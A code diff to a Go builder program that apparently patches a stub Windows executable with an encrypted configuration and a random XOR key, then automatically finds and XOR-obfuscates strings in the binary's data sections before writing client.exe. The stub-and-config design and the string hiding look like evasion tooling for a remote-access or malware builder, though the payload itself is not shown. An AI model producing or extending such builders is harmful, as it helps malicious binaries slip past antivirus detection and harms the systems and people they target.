@@ -4,6 +4,8 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
+	"debug/pe"
+	"encoding/binary"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -126,11 +128,11 @@ func main() {
 	copy(patchedData, data)
 	copy(patchedData[targetIndex+len(marker):], finalPayload)
 
-	// --- Obfuscation logic ---
+	// --- Automated Obfuscation Logic ---
 	rand.Seed(time.Now().UnixNano())
-	xorKey := byte(rand.Intn(254) + 1) // 1-255
+	xorKey := byte(rand.Intn(254) + 1)
 
-	// Patch XOR Key
+	// 1. Find and patch XOR key
 	xorKeyMarker := []byte{0xAA, 0xBB, 0xCC, 0xDD}
 	keyIdx := bytes.Index(patchedData, xorKeyMarker)
 	if keyIdx != -1 {
@@ -138,42 +140,101 @@ func main() {
 		fmt.Printf("[+] Patched XOR key: 0x%02X\n", xorKey)
 	}
 
-	// Patch strings
-	xorMarker := []byte{0xFE, 0xED, 0xFA, 0xCE}
-	processedMarker := []byte{0xCE, 0xFA, 0xED, 0xFE}
-
-	count := 0
-	offset = 0
-	for {
-		idx := bytes.Index(patchedData[offset:], xorMarker)
-		if idx == -1 {
-			break
-		}
-
-		absIdx := offset + idx
-		copy(patchedData[absIdx:absIdx+4], processedMarker)
-
-		// Determine string length (up to 1024 or null terminator)
-		strStart := absIdx + 5
-		strLen := 0
-		for i := 0; i < 1024 && strStart+i < len(patchedData); i++ {
-			if patchedData[strStart+i] == 0 {
-				break
-			}
-			strLen++
-		}
-
-		patchedData[absIdx+4] = byte(strLen)
-
-		// XOR the string
-		for i := 0; i < strLen; i++ {
-			patchedData[strStart+i] ^= xorKey
-		}
-
-		count++
-		offset = absIdx + 4
+	// 2. Detect strings and build string table
+	type StringEntry struct {
+		RVA    uint32
+		Length uint32
 	}
-	fmt.Printf("[+] Obfuscated %d strings\n", count)
+	var stringTable []StringEntry
+
+	f, err := pe.Open(stubPath)
+	if err == nil {
+		defer f.Close()
+
+		var importRVA uint32
+		var importSize uint32
+
+		if oh64, ok := f.OptionalHeader.(*pe.OptionalHeader64); ok {
+			importRVA = oh64.DataDirectory[1].VirtualAddress
+			importSize = oh64.DataDirectory[1].Size
+		} else if oh32, ok := f.OptionalHeader.(*pe.OptionalHeader32); ok {
+			importRVA = oh32.DataDirectory[1].VirtualAddress
+			importSize = oh32.DataDirectory[1].Size
+		}
+
+		for _, sec := range f.Sections {
+			// Only scan data sections
+			if sec.Name == ".rdata" || sec.Name == ".data" {
+				fmt.Printf("[*] Scanning section %s for strings...\n", sec.Name)
+				start := sec.Offset
+				end := sec.Offset + sec.Size
+				if end > uint32(len(patchedData)) {
+					end = uint32(len(patchedData))
+				}
+
+				sectionData := patchedData[start:end]
+				for i := 0; i < len(sectionData); {
+					// Heuristic: printable characters, length >= 4, null terminated
+					if isPrintable(sectionData[i]) {
+						j := i
+						for j < len(sectionData) && isPrintable(sectionData[j]) {
+							j++
+						}
+						length := j - i
+						if length >= 4 && j < len(sectionData) && sectionData[j] == 0 {
+							// Found a potential string
+							rva := sec.VirtualAddress + uint32(i)
+
+							// Skip if it is in the Import Table
+							if rva >= importRVA && rva < importRVA+importSize {
+								i = j + 1
+								continue
+							}
+
+							// Avoid obfuscating the markers themselves
+							isMarker := false
+							if bytes.Contains(sectionData[i:j], marker) || bytes.Contains(sectionData[i:j], xorKeyMarker) {
+								isMarker = true
+							}
+
+							if !isMarker {
+								stringTable = append(stringTable, StringEntry{
+									RVA:    rva,
+									Length: uint32(length),
+								})
+								// XOR the string in patchedData
+								for k := 0; k < length; k++ {
+									patchedData[start+uint32(i)+uint32(k)] ^= xorKey
+								}
+							}
+							i = j + 1
+						} else {
+							i++
+						}
+					} else {
+						i++
+					}
+				}
+			}
+		}
+	}
+
+	fmt.Printf("[+] Detected and obfuscated %d strings\n", len(stringTable))
+
+	// 3. Store string table in the configuration resource
+	// Resource layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries...]
+	// We need to write this after the 2032 bytes of encrypted config
+	tableOffset := targetIndex + len(marker) + 2032
+	if tableOffset+4+len(stringTable)*8 <= len(patchedData) {
+		binary.LittleEndian.PutUint32(patchedData[tableOffset:tableOffset+4], uint32(len(stringTable)))
+		for i, entry := range stringTable {
+			entryOffset := tableOffset + 4 + i*8
+			binary.LittleEndian.PutUint32(patchedData[entryOffset:entryOffset+4], entry.RVA)
+			binary.LittleEndian.PutUint32(patchedData[entryOffset+4:entryOffset+8], entry.Length)
+		}
+	} else {
+		fmt.Printf("[-] Warning: String table too large for remaining space in binary.\n")
+	}
 
 	err = ioutil.WriteFile("client.exe", patchedData, 0755)
 	if err != nil {
@@ -181,6 +242,10 @@ func main() {
 	}
 
 	fmt.Println("[+] Successfully built client.exe")
+}
+
+func isPrintable(b byte) bool {
+	return b >= 32 && b <= 126
 }
 
 func encrypt(plaintext []byte) []byte {
